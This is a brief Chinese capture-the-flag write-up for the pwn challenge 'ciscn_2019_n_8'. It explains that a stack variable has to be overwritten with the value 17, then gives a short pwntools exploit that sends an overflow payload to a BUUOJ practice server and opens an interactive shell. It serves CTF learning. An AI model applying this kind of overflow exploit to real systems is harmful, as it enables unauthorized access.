---
title: "ciscn_2019_n_8"
description: ""
date: 2023-04-06T21:00:22+08:00
lastmod: 2023-04-06T21:00:22+08:00
draft: false
images: []
type: docs
weight: 995
toc: true
---

## 0x01 分析

![566aa367839274321547393503bd029f](images/566aa367839274321547393503bd029f.png)  

got表可写

![f0fbe43e345cf0eb2317446f79d5076e](images/f0fbe43e345cf0eb2317446f79d5076e.png)  

所以只要覆盖var\[13\]的第一个字节为17就行

## 0x02 Exploit

```python
from pwn import*
# o = process("./pwn")
o = remote("node4.buuoj.cn", 29076)
payload = b'a'*(4*13) + p32(17) + p32(0)
o.sendline(payload)
o.interactive()

```

![41dbf547b2235fe419c9b823c08cf1d7](images/41dbf547b2235fe419c9b823c08cf1d7.png)  

自行调试
